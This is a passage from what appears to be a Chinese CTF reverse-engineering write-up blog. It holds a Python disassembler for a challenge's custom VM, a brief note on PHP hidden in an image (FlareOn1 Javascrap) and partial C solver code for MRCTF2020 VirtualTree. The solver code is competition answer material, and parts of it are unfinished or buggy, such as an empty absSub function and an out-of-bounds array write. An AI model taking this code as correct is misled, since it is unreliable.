class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">from z3 import *</span><br><span class="line"></span><br><span class="line">opc &#x3D; [1, 0, 2, 0, 3, 0, 150, 0, 32, 33, 10, 0, 41, 1, 43, 1, 39, 246, 255, 129, 20, 33, 4, 0, 0, 1, 46, 18, 0, 128, 1, 99, 2, 9, 139, 0, 32, 33, 4, 0, 0, 1, 111, 42, 1, 139, 0, 32, 33, 4, 0, 0, 42, 1, 139, 0, 32, 33, 4, 0, 0, 1, 108, 42, 1, 139, 0, 32, 33, </span><br><span class="line">4, 0, 0, 1, 46, 3, 1, 20, 0, 128, 1, 49, 42, 1, 139, 0, 32, 33, 4, 0, 0, 11, 0, 32, </span><br><span class="line">41, 208, 8, 69, 69, 27, 42, 1, 11, 0, 32, 41, 208, 8, 69, 69, 27, 42, 1, 11, 0, 32, </span><br><span class="line">41, 208, 8, 69, 69, 29, 45, 29, 45, 27, 2, 13, 11, 0, 32, 41, 208, 65, 100, 42, 1, 17, 0, 32, 43, 208, 67, 10, 45, 42, 1, 17, 0, 32, 43, 208, 45, 29, 133, 33, 4, 0, 0, </span><br><span class="line">1, 46, 3, 2, 20, 0, 128, 42, 1, 11, 0, 32, 41, 208, 65, 10, 42, 1, 17, 0, 32, 43, 208, 45, 27, 42, 1, 17, 0, 32, 43, 208, 67, 10, 42, 1, 11, 0, 32, 41, 208, 48, 30, 4, </span><br><span class="line">45, 66, 4, 67, 2, 47, 129, 35, 38, 18, 0, 130, 94, 38, 13, 0, 1, 46, 3, 3, 20, 0, 128, 39, 4, 0, 0, 2, 0, 1, 0, 3, 46, 152, 0, 128, 38, 5, 0, 41, 1, 42, 1, 130, 4, 38, </span><br><span class="line">244, 255, 129, 4, 38, 4, 0, 153, 0]</span><br><span class="line"></span><br><span class="line">locs &#x3D; [4203214, 4202753, 4202797, 4202842, 4202887, 4202903, 4202919, 4202935, 4202952, 4202968, 4202985, 4203054, 4203134, -1, 4203219, 4203289, 4203370, 4203440, 4203521, 4203590, 4203670, 4203750, 4203820, 4203901, 4203971, 4204052, 4204093, 4204133, 4204173, 4204254, 4204213, 4204294, 4204335, 4204453, -1, -1, -1, -1, 4204558, 4204376, 4204448, 4204663, 4204712, 4204763, 4204814, 4204835, 4204856, 4204878, 4204901, 4204923, 4204946, 4205020, 4205105, 4205190, 4205266, 4205353, 4205429, 4205516, 4205603, 4205712, 4205821, 4205909, 4206019, 4206107, -1, 4206217, 4206266, 4206319, 4206372, 4206393, 4206414, 4206436, 4206459, 4206481, 4206504, 4206578, 4206665, -1, 4206752, 4206830, 4206919, 4206997, 4207086, 4207173, 4207282, 4207391, 4207479, 4207589, 4207677, -1, -1, -1, -1, -1, -1, -1, -1, 4207787, 4207836, 4207887, 4207938, 4207959, 4207980, 4208002, 4208025, 4208047, 4208070, 4208144, 4208229, -1, 4208314, 4208390, 4208477, 4208553, 4208640, 4208727, 4208836, 4208945, 4209033, 4209143, 4209231, -1, -1, -1, -1, -1, -1, -1, -1, 4209341, 4209428, 4209516, 4209604, 4209638, 4209672, 4209706, 4209741, 4209775, 4209810, 4209896, 4209993, -1, 4210090, 4210177, 4210275, 4210362, 4210460, 4210546, 4210643, 4210740, 4210827, 4210925, 4211012, 4211107]</span><br><span class="line">eip &#x3D; 0</span><br><span class="line"></span><br><span class="line">cpu &#x3D; [0,0,0,0]</span><br><span class="line">tmp&#x3D;0</span><br><span class="line"># vm_dh是flag</span><br><span class="line"># tmp&#x3D;0x2000的话是input</span><br><span class="line">while eip&lt;len(opc):</span><br><span class="line">    s&#x3D;&#39;&#39;</span><br><span class="line">    op &#x3D; opc[eip]</span><br><span class="line">    op1&#x3D;0</span><br><span class="line">    op2&#x3D;0</span><br><span class="line">    op3&#x3D;0</span><br><span class="line">    if eip+1&lt;len(opc):</span><br><span class="line">        op1 &#x3D; opc[eip+1]</span><br><span class="line">    if eip+2&lt;len(opc):</span><br><span class="line">        op2 &#x3D; opc[eip+2]</span><br><span class="line">    if eip+3&lt;len(opc):</span><br><span class="line">        op3 &#x3D; opc[eip+3]</span><br><span class="line">    tmp&#x3D;op1+op2*16</span><br><span class="line">    if op&gt;153:</span><br><span class="line">        break</span><br><span class="line">    loc &#x3D; locs[op]</span><br><span class="line">    print(&#39;%02x:%03X:%x:&#39;%(eip,op,loc),end&#x3D;&quot;&quot;)</span><br><span class="line">    if op&#x3D;&#x3D;0x0:</span><br><span class="line">        s&#x3D;&#39;exit\n&#39;</span><br><span class="line">        eip+&#x3D;1</span><br><span class="line">    elif op&#x3D;&#x3D;0x1:</span><br><span class="line">        s&#x3D;&#39;mov vm_al,%d&#39;%(op1)</span><br><span class="line">        eip+&#x3D;2</span><br><span class="line">    elif op&#x3D;&#x3D;0x2:</span><br><span class="line">        s&#x3D;&#39;mov vm_ah,%d&#39;%(op1)</span><br><span class="line">        eip+&#x3D;2</span><br><span class="line">    elif op&#x3D;&#x3D;0x3:</span><br><span class="line">        s&#x3D;&#39;mov vm_bl,%d&#39;%(op1)</span><br><span class="line">        eip+&#x3D;2</span><br><span class="line">    elif op&#x3D;&#x3D;0x04:</span><br><span class="line">        s&#x3D;&#39;mov vm_al,vm_ah&#39;</span><br><span class="line">        eip+&#x3D;1</span><br><span class="line">    elif op&#x3D;&#x3D;0x08:</span><br><span class="line">        s&#x3D;&#39;mov vm_bl,vm_al&#39;</span><br><span class="line">        eip+&#x3D;1</span><br><span class="line">    elif op&#x3D;&#x3D;0x0b:</span><br><span class="line">        s&#x3D;&#39;mov vm_al,[vm_ip+%xh+vm_ah]&#39;%(tmp)</span><br><span class="line">        eip+&#x3D;3</span><br><span class="line">    elif op&#x3D;&#x3D;0x11:</span><br><span class="line">        s&#x3D;&#39;mov vm_bl,[vm_ip+%xh+vm_ah]&#39;%(tmp)</span><br><span class="line">        eip+&#x3D;3</span><br><span class="line">    elif op&#x3D;&#x3D;0x12:</span><br><span class="line">        s&#x3D;&#39;mov [%xh+vm_ip],vm_al&#39;%(tmp)</span><br><span class="line">        eip+&#x3D;3</span><br><span class="line">    elif op&#x3D;&#x3D;0x14:</span><br><span class="line">        s&#x3D;&#39;mov [vm_ip+%xh+vm_ah],vm_al&#39;%(tmp)</span><br><span class="line">        eip+&#x3D;3</span><br><span class="line">    elif op&#x3D;&#x3D;0x1b:</span><br><span class="line">        s&#x3D;&#39;push vm_al&#39;</span><br><span class="line">        eip+&#x3D;1</span><br><span class="line">    elif op&#x3D;&#x3D;0x1e:</span><br><span class="line">        s&#x3D;&#39;pop vm_ah&#39;</span><br><span class="line">        eip+&#x3D;1</span><br><span class="line">    elif op&#x3D;&#x3D;0x1d:</span><br><span class="line">        s&#x3D;&#39;pop vm_bl&#39;</span><br><span class="line">        eip+&#x3D;1</span><br><span class="line">    elif op&#x3D;&#x3D;0x21:</span><br><span class="line">        to &#x3D; tmp&amp;0xff</span><br><span class="line">        if to&gt;0x7f:</span><br><span class="line">            to-&#x3D;0x100</span><br><span class="line">        s&#x3D;&#39;jz %xh&#39;%(to+eip)</span><br><span class="line">        eip+&#x3D;3</span><br><span class="line">    elif op&#x3D;&#x3D;0x26:</span><br><span class="line">        to &#x3D; tmp&amp;0xff</span><br><span class="line">        if to&gt;0x7f:</span><br><span class="line">            to-&#x3D;0x100</span><br><span class="line">        s&#x3D;&#39;jnz %xh&#39;%(to+eip)</span><br><span class="line">        eip+&#x3D;3</span><br><span class="line">    elif op&#x3D;&#x3D;0x27:</span><br><span class="line">        to &#x3D; tmp&amp;0xff</span><br><span class="line">        if to&gt;0x7f:</span><br><span class="line">            to-&#x3D;0x100</span><br><span class="line">        s&#x3D;&#39;jmp %xh&#39;%(to+eip)</span><br><span class="line">        eip+&#x3D;3</span><br><span class="line">    elif op&#x3D;&#x3D;0x29:</span><br><span class="line">        s&#x3D;&#39;add vm_al,%d&#39;%(op1)</span><br><span class="line">        eip+&#x3D;2</span><br><span class="line">    elif op&#x3D;&#x3D;0x2a:</span><br><span class="line">        s&#x3D;&#39;add vm_ah,%d&#39;%(op1)</span><br><span class="line">        eip+&#x3D;2</span><br><span class="line">    elif op&#x3D;&#x3D;0x2b:</span><br><span class="line">        s&#x3D;&#39;add vm_bl,%d&#39;%(op1)</span><br><span class="line">        eip+&#x3D;2</span><br><span class="line">    elif op&#x3D;&#x3D;0x2f:</span><br><span class="line">        s&#x3D;&#39;add vm_ah,vm_bl&#39;</span><br><span class="line">        eip+&#x3D;1</span><br><span class="line">    elif op&#x3D;&#x3D;0x30:</span><br><span class="line">        s&#x3D;&#39;add vm_bl,vm_al&#39;</span><br><span class="line">        eip+&#x3D;1</span><br><span class="line">    elif op&#x3D;&#x3D;0x2d:</span><br><span class="line">        s&#x3D;&#39;add vm_al,vm_bl&#39;</span><br><span class="line">        eip+&#x3D;1</span><br><span class="line">    elif op&#x3D;&#x3D;0x41:</span><br><span class="line">        s&#x3D;&#39;mul vm_al,%d&#39;%(op1)</span><br><span class="line">        eip+&#x3D;2</span><br><span class="line">    elif op&#x3D;&#x3D;0x42:</span><br><span class="line">        s&#x3D;&#39;mul vm_ah,%d&#39;%(op1)</span><br><span class="line">        eip+&#x3D;2</span><br><span class="line">    elif op&#x3D;&#x3D;0x43:</span><br><span class="line">        s&#x3D;&#39;mul vm_bl,%d&#39;%(op1)</span><br><span class="line">        eip+&#x3D;2</span><br><span class="line">    elif op&#x3D;&#x3D;0x45:</span><br><span class="line">        s&#x3D;&#39;mul vm_al,vm_bl&#39;</span><br><span class="line">        eip+&#x3D;1</span><br><span class="line">    elif op&#x3D;&#x3D;0x81:</span><br><span class="line">        s&#x3D;&#39;test vm_al,%d&#39;%(op1)</span><br><span class="line">        eip+&#x3D;2</span><br><span class="line">    elif op&#x3D;&#x3D;0x82:</span><br><span class="line">        s&#x3D;&#39;test vm_ah,%d&#39;%(op1)</span><br><span class="line">        eip+&#x3D;2</span><br><span class="line">    elif op&#x3D;&#x3D;0x85:</span><br><span class="line">        s&#x3D;&#39;test vm_al,vm_bl&#39;</span><br><span class="line">        eip+&#x3D;1</span><br><span class="line">    elif op&#x3D;&#x3D;0x8b:</span><br><span class="line">        s&#x3D;&#39;test vm_al,[vm_ip+%xh+vm_ah]&#39;%(tmp)</span><br><span class="line">        eip+&#x3D;3</span><br><span class="line">    elif op&#x3D;&#x3D;0x96:</span><br><span class="line">        s&#x3D;&#39;test vm_ah,[vm_ip+%xh+vm_bl]&#39;%(tmp)</span><br><span class="line">        eip+&#x3D;3</span><br><span class="line">    elif op&#x3D;&#x3D;0x98:</span><br><span class="line">        s&#x3D;&#39;test vm_bl,[vm_ip+%xh+vm_ah]&#39;%(tmp)</span><br><span class="line">        eip+&#x3D;3</span><br><span class="line">    elif op&#x3D;&#x3D;0x99:</span><br><span class="line">        s&#x3D;&#39;success&#39;</span><br><span class="line">        eip+&#x3D;1</span><br><span class="line">    else:</span><br><span class="line">        s&#x3D;&#39;nop&#39;</span><br><span class="line">        eip+&#x3D;1</span><br><span class="line">    print(s)</span><br></pre></td></tr></table></figure>
<h2 id="rev-FlareOn1-Javascrap"><a href="#rev-FlareOn1-Javascrap" class="headerlink" title="[rev][FlareOn1]Javascrap"></a>[rev][FlareOn1]Javascrap</h2><p>看html看了大半天，原来猫腻在图片中</p>
<p>二进制打开图片，最后有一段php代码，然后无限base64套娃就解出来了</p>
<h2 id="rev-MRCTF2020-VirtualTree"><a href="#rev-MRCTF2020-VirtualTree" class="headerlink" title="[rev][MRCTF2020]VirtualTree"></a>[rev][MRCTF2020]VirtualTree</h2><p>被骗了555</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;setjmp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span>&#123;</span></span><br><span class="line">    <span class="keyword">int8_t</span> data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span>*<span class="title">left</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span>*<span class="title">right</span>;</span></span><br><span class="line">&#125; TreeNode;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printArray</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *name, <span class="keyword">uint8_t</span> *v, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;========%s=========\n&quot;</span>, name);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%02X,&quot;</span>, v[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n=================\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="keyword">int</span> <span class="title">sub_401120</span><span class="params">(TreeNode**treeHead)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  TreeNode *v1[<span class="number">15</span>]; <span class="comment">// [esp+0h] [ebp-48h]</span></span><br><span class="line">  TreeNode *v2; <span class="comment">// [esp+3Ch] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+40h] [ebp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [esp+44h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">16</span>; ++i )</span><br><span class="line">    v1[i] = (TreeNode *)<span class="built_in">malloc</span>(<span class="number">12</span>);</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">16</span>; ++j )&#123;</span><br><span class="line">    v1[j]-&gt;data = j + <span class="number">65</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v1[<span class="number">0</span>]-&gt;right = v1[<span class="number">1</span>];</span><br><span class="line">  v1[<span class="number">0</span>]-&gt;left = v1[<span class="number">2</span>];</span><br><span class="line">  v1[<span class="number">1</span>]-&gt;right = v1[<span class="number">3</span>];</span><br><span class="line">  v1[<span class="number">1</span>]-&gt;left = v1[<span class="number">4</span>];</span><br><span class="line">  v1[<span class="number">2</span>]-&gt;right = v1[<span class="number">5</span>];</span><br><span class="line">  v1[<span class="number">2</span>]-&gt;left = v1[<span class="number">6</span>];</span><br><span class="line">  v1[<span class="number">3</span>]-&gt;right = v1[<span class="number">7</span>];</span><br><span class="line">  v1[<span class="number">3</span>]-&gt;left = v1[<span class="number">8</span>];</span><br><span class="line">  v1[<span class="number">4</span>]-&gt;right = v1[<span class="number">9</span>];</span><br><span class="line">  v1[<span class="number">4</span>]-&gt;left = <span class="number">0</span>;</span><br><span class="line">  v1[<span class="number">5</span>]-&gt;right = v1[<span class="number">10</span>];</span><br><span class="line">  v1[<span class="number">5</span>]-&gt;left = <span class="number">0</span>;</span><br><span class="line">  v1[<span class="number">6</span>]-&gt;right = v1[<span class="number">11</span>];</span><br><span class="line">  v1[<span class="number">6</span>]-&gt;left = v1[<span class="number">12</span>];</span><br><span class="line">  v1[<span class="number">7</span>]-&gt;right = <span class="number">0</span>;</span><br><span class="line">  v1[<span class="number">7</span>]-&gt;left = <span class="number">0</span>;</span><br><span class="line">  v1[<span class="number">8</span>]-&gt;right = <span class="number">0</span>;</span><br><span class="line">  v1[<span class="number">8</span>]-&gt;left = v1[<span class="number">13</span>];</span><br><span class="line">  v1[<span class="number">9</span>]-&gt;left = <span class="number">0</span>;</span><br><span class="line">  v1[<span class="number">9</span>]-&gt;right = <span class="number">0</span>;</span><br><span class="line">  v1[<span class="number">10</span>]-&gt;right = v1[<span class="number">14</span>];</span><br><span class="line">  v1[<span class="number">10</span>]-&gt;left = v2;</span><br><span class="line">  v1[<span class="number">12</span>]-&gt;left = <span class="number">0</span>;</span><br><span class="line">  v1[<span class="number">12</span>]-&gt;right = <span class="number">0</span>;</span><br><span class="line">  v1[<span class="number">11</span>]-&gt;left = <span class="number">0</span>;</span><br><span class="line">  v1[<span class="number">11</span>]-&gt;right = <span class="number">0</span>;</span><br><span class="line">  v1[<span class="number">13</span>]-&gt;left = <span class="number">0</span>;</span><br><span class="line">  v1[<span class="number">13</span>]-&gt;right = <span class="number">0</span>;</span><br><span class="line">  v2-&gt;left = <span class="number">0</span>;</span><br><span class="line">  v2-&gt;right = <span class="number">0</span>;</span><br><span class="line">  v1[<span class="number">14</span>]-&gt;left = <span class="number">0</span>;</span><br><span class="line">  v1[<span class="number">14</span>]-&gt;right = <span class="number">0</span>;</span><br><span class="line">  *treeHead = v1[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">postTraverse</span><span class="params">(TreeNode*head)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(head)&#123;</span><br><span class="line">        postTraverse(head-&gt;left);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(head)&#123;</span><br><span class="line">        postTraverse(head-&gt;right);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(head)<span class="built_in">printf</span>(<span class="string">&quot;0x%x,&quot;</span>,head-&gt;data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">diyBit</span><span class="params">(<span class="keyword">uint8_t</span> *data,<span class="keyword">uint32_t</span> a1,<span class="keyword">uint32_t</span> a2)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;=a2;i++)&#123;</span><br><span class="line">        data[i]^=a1;</span><br><span class="line">        data[i]=data[i]&lt;&lt;(<span class="number">8</span>-a2)|data[i]&gt;&gt;a2;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">size_t</span> j=<span class="number">1</span>;j&lt;<span class="number">15</span>;j++)&#123;</span><br><span class="line">            data[i]^=data[j]&amp;<span class="number">0xDF</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">reDiyBit</span><span class="params">(<span class="keyword">uint8_t</span> *data,<span class="keyword">uint32_t</span> a1,<span class="keyword">uint32_t</span> a2)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">size_t</span> i=a2;i&lt;a2+<span class="number">1</span>;i--)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">size_t</span> j=<span class="number">1</span>;j&lt;<span class="number">15</span>;j++)&#123;</span><br><span class="line">                data[i]^=data[j]&amp;<span class="number">0xdf</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            data[i]^=<span class="number">1</span>&lt;&lt;i%<span class="number">8</span>;</span><br><span class="line">            data[i]=data[i]&gt;&gt;(<span class="number">8</span>-a2%<span class="number">8</span>)|data[i]&lt;&lt;a2%<span class="number">8</span>;</span><br><span class="line">            data[i]^=a1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">uint8_t</span> <span class="title">sub</span><span class="params">(<span class="keyword">uint8_t</span> a1,<span class="keyword">uint8_t</span> a2)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a1-a2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">uint8_t</span> <span class="title">xor</span><span class="params">(<span class="keyword">uint8_t</span> a1,<span class="keyword">uint8_t</span> a2)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a1^a2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">uint8_t</span> <span class="title">absSub</span><span class="params">(<span class="keyword">uint8_t</span> a1,<span class="keyword">uint8_t</span> a2)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(a1&gt;a2)&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sub_4016F0</span><span class="params">(<span class="keyword">uint8_t</span> *data)</span></span>&#123;</span><br><span class="line">    data[<span class="number">15</span>] = sub(data[<span class="number">15</span>],<span class="number">2</span>);</span><br><span class="line">    data[<span class="number">14</span>] = <span class="keyword">xor</span>(data[<span class="number">14</span>],data[<span class="number">15</span>]);</span><br><span class="line">    data[<span class="number">12</span>] = absSub(data[<span class="number">12</span>],data[<span class="number">2</span>]);</span><br><span class="line">    data[<span class="number">11</span>] = <span class="keyword">xor</span>(data[<span class="number">11</span>],data[<span class="number">12</span>]);</span><br><span class="line">    data[<span class="number">10</span>]=absSub(data[<span class="number">10</span>],data[<span class="number">7</span>]);</span><br><span class="line">    data[<span class="number">9</span>] = absSub(data[<span class="number">9</span>],data[<span class="number">8</span>]);</span><br><span class="line">    data[<span class="number">8</span>] = <span class="keyword">xor</span>(data[<span class="number">8</span>],data[<span class="number">7</span>]);</span><br><span class="line">    data[<span class="number">7</span>] = sub(data[<span class="number">7</span>],<span class="number">3</span>);</span><br><span class="line">    data[<span class="number">6</span>] = absSub(data[<span class="number">6</span>],data[<span class="number">1</span>]);</span><br><span class="line">    data[<span class="number">4</span>] = <span class="keyword">xor</span>(data[<span class="number">4</span>],data[<span class="number">5</span>]);</span><br><span class="line">    data[<span class="number">3</span>] = absSub(data[<span class="number">3</span>],data[<span class="number">7</span>]);</span><br><span class="line">    data[<span class="number">2</span>] = sub(data[<span class="number">2</span>],<span class="number">7</span>);</span><br><span class="line">    data[<span class="number">1</span>] = <span class="keyword">xor</span>(data[<span class="number">1</span>],data[<span class="number">2</span>]);</span><br><span class="line">    data[<span class="number">0</span>] = sub(data[<span class="number">0</span>],<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// TreeNode*head;</span></span><br><span class="line">    <span class="comment">// sub_401120(&amp;head);</span></span><br><span class="line">    <span class="comment">// postTraverse(head);</span></span><br><span class="line">    <span class="comment">// printf(&quot;\n&quot;);</span></span><br><span class="line">    <span class="keyword">uint8_t</span> xorData[] = &#123;<span class="number">0x4d</span>,<span class="number">0x4c</span>,<span class="number">0x47</span>,<span class="number">0x50</span>,<span class="number">0x4f</span>,<span class="number">0x4b</span>,<span class="number">0x46</span>,<span class="number">0x43</span>,<span class="number">0x4a</span>,<span class="number">0x45</span>,<span class="number">0x4e</span>,<span class="number">0x49</span>,<span class="number">0x48</span>,<span class="number">0x44</span>,<span class="number">0x42</span>,<span class="number">0x41</span>,<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,xorData);</span><br><span class="line">    <span class="keyword">uint8_t</span> cmpData[] = &#123;<span class="number">0x17</span>, <span class="number">0x63</span>, <span class="number">0x77</span>, <span class="number">0x3</span>, <span class="number">0x52</span>, <span class="number">0x2e</span>, <span class="number">0x4a</span>, <span class="number">0x28</span>, <span class="number">0x52</span>, <span class="number">0x1b</span>, <span class="number">0x17</span>, <span class="number">0x12</span>, <span class="number">0x3a</span>, <span class="number">0xa</span>, <span class="number">0x6c</span>, <span class="number">0x62</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span 